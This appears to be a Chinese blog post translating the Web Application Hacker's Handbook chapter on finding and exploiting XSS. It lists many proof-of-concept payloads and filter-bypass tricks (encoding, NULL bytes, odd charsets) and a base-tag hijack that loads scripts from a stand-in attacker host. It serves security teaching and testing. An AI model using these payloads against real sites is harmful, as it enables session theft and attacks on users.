---
layout:     post
title:      Chapter 12 Attacking Users: Cross-Site Scripting(3) - Finding and Exploiting XSS Vulnerabilities(1_1)
subtitle:   查找和利用XSS漏洞(1_1)
date:       2020-03-17
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 11

# 查找和利用XSS漏洞(Finding and Exploiting XSS Vulnerabilities)

识别XSS漏洞的基本方法是使用标准的概念验证攻击字符串，例如：
```
"><script>alert(document.cookie)</script>
```
该字符串作为每个参数提交给应用程序的每个页面，并监视响应以查找同一字符串的外观。 如果发现攻击字符串在响应中未更改的情况，则几乎可以肯定该应用程序容易受到XSS的攻击。

如果您只是想在应用程序中尽快识别XSS的某个实例，以对其他应用程序用户发起攻击，则这种基本方法可能是最有效的，因为它可以轻松实现自动化并产生最少的误报。 但是，如果您的目标是对应用程序执行全面的测试以找到尽可能多的单个漏洞，则需要使用更复杂的技术来补充基本方法。 不能通过基本的检测方法识别的应用程序中存在XSS漏洞的几种不同方式：
- 许多应用程序都实施了基于黑名单的基本过滤器，以防止XSS攻击。 这些过滤器通常在请求参数中查找诸如`<script>`之类的表达式，并采取一些防御措施，例如删除或编码该表达式或阻止该请求。 这些过滤器通常会阻塞基本检测方法中常用的攻击字符串。 但是，仅由于过滤了一个常见的攻击字符串，并不意味着不存在可利用的漏洞。 正如您将看到的，在某些情况下，无需使用`<script>`标记甚至不使用通常过滤的字符（例如`"` `<` `>`和`/`），都可以创建有效的XSS利用。
- 在许多应用程序中实施的抗XSS过滤器都是有缺陷的，可以通过各种方法来规避。 例如，假设应用程序在处理用户输入之前会剥离所有`<script>`标记。 这意味着基本方法中使用的攻击字符串不会在应用程序的任何响应中返回。 但是，以下一个或多个字符串可能会绕过过滤器并导致XSS成功利用：
```
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>
```
请注意，在某些情况下，输入字符串可以在返回服务器响应之前进行清理，解码或其他修改，但对于XSS攻击来说仍然足够。 在这种情况下，基于提交特定字符串并检查其是否出现在服务器响应中的检测方法本身不会成功地发现漏洞。

利用基于DOM的XSS漏洞，攻击有效载荷不一定会在服务器的响应中返回，而是会保留在浏览器DOM中，并由客户端JavaScript从那里进行访问。 同样，在这种情况下，找到基于特定字符串并检查其在服务器响应中的出现的方法不会成功。

# 查找和利用反射型XSS漏洞(Finding and Exploiting Reflected XSS Vulnerabilities)

检测可靠的XSS漏洞的最可靠方法涉及系统地研究在应用程序映射过程中确定的所有用户输入入口点（请参阅第4章），并遵循以下步骤：
- 在每个入口点提交一个良性字母字符串。
- 确定该字符串在应用程序的响应中反映的所有位置。
- 对于每个反射，请确定反射数据出现的句法上下文。
- 提交针对反射的句法上下文量身定制的修改后的数据，尝试将任意脚本引入响应中。
- 如果反射的数据被阻止或清除，阻止了脚本的执行，请尝试理解并规避应用程序的防御性筛选器。

# 1 识别用户输入的反映(Identifying Reflections of User Input)

测试过程的第一步是向每个入口点提交一个良性字符串，并标识响应中该字符串所反映的每个位置。

**HACK STEPS**
- 1. 选择一个唯一的任意字符串，该字符串不会出现在应用程序中的任何位置，并且仅包含字母字符，因此不太可能受到任何XSS特定的过滤器的影响。 例如：
```
myxsstestdmqlwp
```
将此字符串作为每个参数提交到每个页面，一次仅定位一个参数。
- 2. 监视应用程序的响应，以查看是否出现相同的字符串。 记录每个参数的值，这些参数的值将被复制到应用程序的响应中。 这些不一定很容易受到攻击，但是确定的每个实例都是进行进一步调查的候选对象，如下一节所述。
- 3. 请注意，`GET`和`POST`请求都需要进行测试。 您应该在URL查询字符串和消息正文中都包含每个参数。 尽管存在只能通过POST请求触发的XSS漏洞的较小范围的传递机制，但是仍然可以利用，如前所述。
- 4. 请注意，GET和POST请求都需要进行测试。 您应该在URL查询字符串和消息正文中都包含每个参数。 尽管存在只能通过POST请求触发的XSS漏洞的较小范围的传递机制，但是仍然可以利用，如前所述。
- 5. 除了标准请求参数之外，您还应该测试应用程序在其中处理HTTP请求标头内容的每个实例。 错误消息中会出现一个常见的XSS漏洞，其中将Referer和User-Agent标头等项目复制到消息的内容中。 这些标头是传递反射的XSS攻击的有效手段，因为攻击者可以使用Flash对象诱使受害者发出包含任意HTTP标头的请求。

# 2 测试反射以引入脚本(Testing Reflections to Introduce Script)

您必须手动调查已确定的每个反射输入实例，以验证该输入是否确实可利用。 在响应中反映数据的每个位置，您需要确定该数据的句法上下文。 您必须找到一种修改输入的方法，以便在将输入复制到应用程序响应中的同一位置后，可以执行任意脚本。 让我们看一些例子。

## 2.1 示例1：标签属性值(Example 1: A Tag Attribute Value)
假设返回的页面包含以下内容：
```
<input type="text" name="address1" value="myxsstestdmqlwp">
```
进行XSS攻击的一种明显方法是终止包含属性值的双引号，关闭<input>标记，然后采用一些引入JavaScript的方法，例如<script>标记。 例如：
```
"><script>alert(1)</script>
```
在这种情况下，可以绕过某些输入过滤器的另一种方法是保留在<input>标记本身内，但注入一个包含JavaScript的事件处理程序。 例如：
```
" onfocus="alert(1)
```
## 2.2 示例2：JavaScript字符串(Example 2: A JavaScript String)
假设返回的页面包含以下内容：
```
<script>var a = 'myxsstestdmqlwp'; var b = 123; ... </script>
```
在这里，您控制的输入将直接插入到现有脚本中带引号的字符串中。 要利用漏洞，您可以在字符串周围用单引号引起来，用分号终止该语句，然后直接进入所需的JavaScript：
```
'; alert(1); var foo='
```
请注意，因为您已经终止了带引号的字符串，为防止JavaScript解释器内发生错误，您必须确保脚本在注入代码之后以有效的语法继续正常运行。 在此示例中，声明了变量foo，并打开了第二个带引号的字符串。 它将由紧随您的字符串之后的代码终止。 通常有效的另一种方法是用`//`结束输入，以注释掉该行的其余部分。

## 2.3 示例3：包含URL的属性(Example 3: An Attribute Containing a URL)
假设返回的页面包含以下内容：
```
<a href="myxsstestdmqlwp">Click here ...</a>
```
在这里，您控制的字符串将插入到<a>标记的href属性中。 在这种情况下，以及在许多其他属性可能包含URL的情况下，您可以使用javascript：协议直接在URL属性内引入脚本：
```
javascript:alert(1);
```
因为您的输入反映在tag属性中，所以您也可以注入事件处理程序，如前所述。

对于适用于所有当前浏览器的攻击，可以将无效的图像名称与`onclick`事件处理程序一起使用：
```
#"onclick="javascript:alert(1)
```
**TIP**<br>
与其他攻击一样，请确保对请求中有意义的任何特殊字符进行URL编码，包括`＆` `=` `+` `;`和`空格`。

**HACK STEPS**<br>
对前面步骤中标识的每个反射输入执行以下操作：<br>

- 1. 查看HTML源代码以标识反映您的唯一字符串的位置。
- 2. 如果字符串出现不止一次，则每次出现都需要被视为一个单独的潜在漏洞并进行单独调查。
- 3. 根据用户可控制的字符串在HTML中的位置，确定如何进行修改以引起任意脚本的执行。通常，许多不同的方法都可能成为攻击的手段，如本章稍后所述。
- 4. 通过将其提交给应用程序来测试您的漏洞利用。 如果您制作的字符串仍未修改地返回，则该应用程序容易受到攻击。 通过使用概念证明脚本显示警报对话框来仔细检查语法是否正确，并在呈现响应时确认该对话框确实出现在浏览器中。

# 3 探测防御性过滤器(Probing Defensive Filters)

很多时候，您会发现服务器以某种方式修改了您最初尝试的利用程序，因此它们无法成功执行您注入的脚本。 如果发生这种情况，请不要放弃！ 您的下一个任务是确定正在发生哪些影响您输入的服务器端处理。 有三种广泛的可能性：
- 该应用程序（或保护该应用程序的Web应用程序防火墙）已识别出攻击特征并阻止了您的输入。
- 该应用程序已接受您的输入，但已对攻击字符串进行了某种清理或编码。
- 该应用程序已将您的攻击字符串截断为固定的最大长度。

我们将依次研究每种情况，并讨论可以避免应用程序处理过程中出现的障碍的各种方法。

# 4 击败基于签名的过滤器(Beating Signature-Based Filters)
在第一种类型的过滤器中，应用程序对攻击字符串的响应通常与对无害字符串的响应完全不同。 例如，它可能会显示一条错误消息，甚至可能表明已检测到可能的XSS攻击，如图12-8所示。

![figure12-8](/img/web_hacking/twahh/figure12-8.jpg)

如果发生这种情况，下一步就是确定输入中哪些字符或表达式正在触发过滤器。 一种有效的方法是依次删除字符串的不同部分，然后查看输入是否仍被阻止。 通常，此过程很快就会确定诸如`<script>`之类的特定表达式导致请求被阻止。 然后，您需要测试过滤器以确定是否存在任何旁路。

将脚本代码引入HTML页面的方法有很多，通常可以绕过基于签名的过滤器。 您可以找到一种引入脚本的替代方法，也可以使用浏览器可以容忍的语法稍有错误的语法。 本节研究了执行脚本的多种不同方法。 然后，它描述了可用于绕过常见滤波器的多种技术。

## 4.1 脚本代码介绍的方法(Ways of Introducing Script Code)
您可以通过四种主要方式将脚本代码引入HTML页面。 我们将依次研究它们，并给出一些不常见的示例，这些示例可能会成功绕过基于签名的输入过滤器。

**NOTE**<br>
浏览器对不同HTML和脚本语法的支持差异很大。 各个浏览器的行为通常随每个新版本而变化。 因此，任何有关单个浏览器行为的"权威性"指南都可能很快过时。 但是，从安全性的角度来看，应用程序必须以健壮的方式运行所有流行浏览器的当前和最新版本。 如果只能使用仅一小部分用户使用的特定浏览器来进行XSS攻击，则这仍然构成应解决的漏洞。 在撰写本文时，本章中给出的所有示例均在至少一个主要的浏览器上运行。

作为参考，本章撰写于2011年3月，这些攻击描述了至少以下一项的所有工作：
-  Internet Explorer version 8.0.7600.16385
-  Firefox version 3.6.15

## 4.2 脚本标签(Script Tags)
除了直接使用<script>标记之外，您还可以通过多种方式使用一些复杂的语法来包装标记的用法，从而破坏某些过滤器：
```
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
Click here</a>
```
前面的示例中的Base64编码的字符串是：
```
<script>alert(1)</script>
```
## 4.3 事件处理程序(Event Handlers)
许多事件处理程序可以与各种标记一起使用，以使脚本执行。 以下是一些鲜为人知的示例，它们无需任何用户交互即可执行脚本：
```
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
```
HTML5使用事件处理程序提供了大量新的向量。 其中包括使用autofocus属性自动触发以前需要用户交互的事件：
```
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```
它允许在结束标记中使用事件处理程序：
```
</a onmousemove=alert(1)>
```
最后，HTML5引入了带有事件处理程序的新标记：
```
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```
## 4.4 脚本伪协议(Script Pseudo-Protocols)
脚本伪协议可以在各个位置使用，以在需要URL的属性内执行内联脚本。 这里有些例子：
```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
```
尽管最常用的方法是使用javascript伪协议作为该技术的示例，但也可以在Internet Explorer浏览器上使用`vbs`协议，如本章稍后所述。

与事件处理程序一样，HTML5提供了一些在XSS攻击中使用脚本伪协议的新方法：
```
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```
当定位输入过滤器时，新的事件源标签特别有用。 与任何HTML5之前的标签不同，它的名称包含连字符，因此使用此标签可能会绕过基于旧正则表达式的过滤器，这些过滤器假定标签名称只能包含字母。

## 4.5 动态评估样式(Dynamically Evaluated Styles)
某些浏览器支持在动态评估的CSS样式中使用JavaScript。 下面的示例在兼容模式下运行时，适用于IE7和更早版本，以及更高版本：
```
<x style=x:expression(alert(1))>
```
IE的更高版本删除了对先前语法的支持，因为它实际上仅在XSS攻击中使用。 但是，在更高版本的IE上，可以使用以下命令达到相同的效果：
```
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```
Firefox浏览器过去曾通过`moz-binding`属性允许基于CSS的攻击，但是对此功能的限制意味着它现在在大多数XSS场景中不再有用。

# 5 绕过过滤器：HTML(Bypassing Filters: HTML)
前面的部分描述了可从HTML页面内执行脚本代码的多种方式。 在许多情况下，您可能会发现，只需切换到另一种鲜为人知的脚本执行方法，就可以击败基于签名的过滤器。 如果失败了，则需要研究混淆攻击的方法。 通常，您可以通过引入意想不到的变化来做到这一点用过滤器接受的语法以及返回输入时浏览器允许的格式。 本节研究了混淆HTML语法以击败常见过滤器的方法。 下一节将相同的原理应用于JavaScript和VBScript语法。

用于阻止XSS攻击的基于签名的过滤器通常使用正则表达式或其他技术来标识关键的HTML组件，例如标记括号，标记名称，属性名称和属性值。 例如，过滤器可能试图阻止包含使用特定标签或已知允许引入脚本的属性名称的HTML的输入，或者可能尝试阻止以脚本伪协议开头的属性值。 通过以一种或多种浏览器允许的方式在HTML的关键点处放置不寻常的字符，可以绕开许多这些过滤器。

要查看此技术的实际效果，请考虑以下简单利用：
```
<img onerror=alert(1) src=a>
```
您可以通过多种方式修改此语法，但仍然可以在至少一个浏览器上执行代码。 我们将依次检查每个。 实际上，您可能需要将这些技术中的几种结合在一个漏洞中，以绕过更复杂的输入过滤器。
## 5.1 标签名称(The Tag Name)
从开始标签名称开始，可以通过更改所使用字符的大小写来绕过最简单的过滤器：
```
<iMg onerror=alert(1) src=a>
```
更进一步，您可以在任何位置插入NULL字节：
```
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
```
（在这些示例中，[`％XX`]表示具有十六进制ASCII码`XX`的文字字符。向应用程序提交攻击时，通常会使用字符的URL编码形式。在查看应用程序的响应时，您需要 查找正好反映的文字解码字符。）

**TIP**<br>
NULL字节技巧可在HTML页面中任何地方的Internet Explorer上使用。 在XSS攻击中自由使用NULL字节通常可以提供一种快速的方法，以绕过不了解IE行为的基于签名的过滤器。

从历史上看，使用NULL字节可有效防止配置为阻止包含已知攻击字符串的请求的Web应用程序防火墙（WAF）。 因为出于性能原因，WAF通常是用本机代码编写的，所以NULL字节终止了出现它的字符串。 这样可以防止WAF看到NULL之后出现的恶意有效负载（有关更多详细信息，请参见第16章）。

在标签名称中，如果您稍稍修改示例，则可以使用任意标签名称引入事件处理程序，从而绕过仅阻止特定命名标签的过滤器：
```
<x onclick=alert(1) src=a>Click here</x>
```
在某些情况下，您可以引入具有各种名称的新标签，但找不到使用这些标签直接执行代码的任何方法。 在这种情况下，您可能可以使用称为"基本标签劫持"的技术来发动攻击。 `<base>`标记用于指定一个URL，浏览器应使用该URL来解析随后出现在页面中的任何相对URL。 如果可以引入新的`<base>`标记，并且页面在使用相对URL的反射点之后执行任何`<script>`包含的内容，则可以为您控制的服务器指定基本URL。 当浏览器加载HTML页面其余部分中指定的脚本时，它们是从您指定的服务器加载的，但仍在调用它们的页面的上下文中执行。 例如：
```
<base href="http://mdattacker.net/badscripts/">
...
<script src="goodscript.js"></script>
```
根据规范，`<base>`标签应出现在HTML页面的`<head>`部分中。 但是，某些浏览器（包括Firefox）会接受出现在页面任何位置的`<base>`标签，从而大大扩大了这种攻击的范围。

## 5.2 标签名称后的空格(Space Following the Tag Name)
几个字符可以代替标签名称和第一个属性名称之间的空格：
```
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
```
请注意，即使在攻击不需要任何标签属性的地方，您也应始终尝试在标签名称之后添加一些多余的内容，因为这会绕过一些简单的过滤器：
```
<script/anyjunk>alert(1)</script>
```
## 5.3 属性名称(Attribute Names)
在属性名称内，您可以使用前面所述的相同NULL字节技巧。 这绕过了许多简单的过滤器，这些过滤器试图通过阻塞以`on`开头的属性名称来阻塞事件处理程序。
```
<img o[%00]nerror=alert(1) src=a>
```
## 5.4 属性分隔符(Attribute Delimiters)
在原始示例中，没有对属性值进行定界，因此在可以引入另一个属性之前，在该属性值后需要一些空格以指示其已结束。 属性可以选择用双引号或单引号定界，或者在IE上用反引号定界：
```
<img onerror="alert(1)"src=a>
<img onerror='alert(1)'src=a>
<img onerror=`alert(1)`src=a>
```
在前面的示例中切换属性提供了另一种绕过某些过滤器的方法，这些过滤器检查以on开头的属性名称。 如果过滤器不知道反引号充当属性定界符，则将以下示例视为包含单个属性，该名称不是事件处理程序的名称：
```
<img src=`a`onerror=alert(1)>
```
通过将引号分隔的属性与标记名称后的意外字符结合在一起，可以设计出不使用任何空格的攻击，从而绕过一些简单的过滤器：
```
<img/onerror="alert(1)"src=a>
```
## 5.5 属性值(Attribute Values)
在属性值本身内，您可以使用NULL字节技巧，还可以对值内的字符进行HTML编码：
```
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
```
因为浏览器先对属性值进行HTML解码，然后再对其进行进一步处理，所以您可以使用HTML编码来混淆脚本代码的使用，从而避免使用许多过滤器。 例如，以下攻击绕过了许多试图阻止使用JavaScript伪协议处理程序的过滤器：
```
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
```
使用HTML编码时，值得注意的是，浏览器以某种方式容忍与规范的各种差异，即使是意识到HTML编码问题的过滤器也可能会忽略这些方式。 您可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾的分号。 以下示例均可以在至少一个浏览器上运行：
```
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```
## 5.6 标签支架(Tag Brackets)
在某些情况下，通过利用古怪的应用程序或浏览器行为，可以使用无效的标签括弧，并仍然使浏览器按照攻击所需的方式处理标签。

某些应用程序在应用了输入过滤器之后，会对输入进行多余的URL解码，因此以下输入出现在请求中：
```
%253cimg%20onerror=alert(1)%20src=a%253e
```
由应用程序服务器进行URL编码，并通过以下方式传递给应用程序：
```
%3cimg onerror=alert(1) src=a%3e
```
它不包含任何标签括号，因此不受输入过滤器的限制。 但是，执行第二个URL解码的应用程序，因此输入变为：
```
<img onerror=alert(1) src=a>
```
它会回显给用户，从而导致攻击执行。

如第2章所述，当应用程序框架根据字形或语音的相似性将不寻常的Unicode字符"转换"为最接近的ASCII等效字符时，可能会发生类似的情况。 例如，以下输入使用Unicode双角引号（％u00AB和％u00BB）代替标签括号：
```
«img onerror=alert(1) src=a»
```
应用程序的输入过滤器可能允许此输入，因为它不包含任何有问题的HTML。 但是，如果应用程序框架在将输入插入响应中的点将引号转换为标记字符，则攻击成功。 已经发现许多应用程序容易受到这种攻击，开发人员可以忽略这些攻击。

一些输入过滤器通过简单地匹配左尖括号和右尖括号，提取内容并将其与标记名称的黑名单进行比较来识别HTML标记。 在这种情况下，您可以使用浏览器允许的超级括号来绕过过滤器：
```
<<script>alert(1);//<</script>
```
在某些情况下，可以利用浏览器的HTML解析器中的意外行为来提供绕过应用程序输入过滤器的攻击。 例如，以下使用ECMAScript for XML（E4X）语法的HTML并不包含有效的打开脚本标签，但仍在当前版本的Firefox上执行随附的脚本：
```
<script<{alert(1)}/></script>
```
**TIP**<br>
在所描述的几个过滤器绕过中，攻击导致HTML格式不正确，但客户端浏览器可以忍受。 由于许多合法网站都包含不严格符合标准的HTML，因此浏览器会接受各种形式的HTML。 它们有效地修复了呈现页面之前幕后的错误。 通常，当您尝试在异常情况下微调攻击时，查看浏览器根据服务器的实际响应构建的虚拟HTML可能会有所帮助。 在Firefox中，您可以使用WebDeveloper工具，该工具包含恰好执行此任务的"查看生成的源"功能。

## 5.7 字符集(Character Sets)
在某些情况下，通过使应用程序接受攻击载荷的非标准编码，您可以采用一种有效的方法来绕过许多类型的过滤器。 以下示例显示了备用字符集中字符串`<script>alert(document.cookie)</script>`的一些表示形式：<br>

**UTF-7**
```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```
**US-ASCII**
```
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE                            ; script¾
```
**UTF-16**
```
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
```
这些编码的字符串将绕过许多常见的反XSS过滤器。 进行成功攻击的挑战是使浏览器使用所需的字符集来解释响应。 如果您控制HTTP Content-Type标头或其相应的HTML元标记，则可以使用非标准字符集来绕过应用程序的过滤器，并使浏览器以所需的方式解释有效负载。 在某些应用程序中，字符集参数实际上是在某些请求中提交的，使您可以直接设置应用程序响应中使用的字符集。

如果默认情况下应用程序使用多字节字符集（例如Shift-JIS），则可以通过提交在使用的字符集中具有特殊意义的字符来绕过某些输入过滤器。 例如，假设在应用程序的响应中返回了两条用户输入：
```
<img src="image.gif" alt="[input1]" /> ... [input2]
```
对于input1，应用程序阻止包含引号的输入，以防止攻击者终止带引号的属性。 对于input2，应用程序阻止包含尖括号的输入，以防止攻击者使用任何HTML标记。 这似乎很可靠，但是攻击者可能可以使用以下两个输入来提供利用：
```
input1: [%f0]
input2: "onload=alert(1);
```
在Shift-JIS字符集中，各种原始字节值（包括0xf0）用于表示2字节字符，该字符由该字节和下一个字节组成。 因此，当浏览器处理input1时，0xf0字节后的引号被解释为2字节字符的一部分，因此不对属性值定界。 HTML解析器将一直持续到到达input2中提供的引号为止，该引号终止该属性，从而使攻击者提供的事件处理程序可以解释为附加的标记属性：
```
<img src="image.gif" alt="? /> ... "onload=alert(1);
```
当在广泛使用的多字节字符集UTF-8中识别出此类漏洞时，浏览器供应商做出了回应，提出了阻止攻击成功的解决方案。 但是，当前针对某些其他浏览器较少使用的多字节字符集（包括Shift-JIS，EUC-JP和BIG5），同样的攻击仍在某些浏览器上起作用。

[Chapter 12 Attacking Users: Cross-Site Scripting(2) - XSS Attacks in Action](https://dm116.github.io/2020/03/17/attacking-users-cross-site-scripting_2)<br>
[Chapter 12 Attacking Users: Cross-Site Scripting(3) - Finding and Exploiting XSS Vulnerabilities(1_1)](https://dm116.github.io/2020/03/17/attacking-users-cross-site-scripting_3_1_2/)<br>
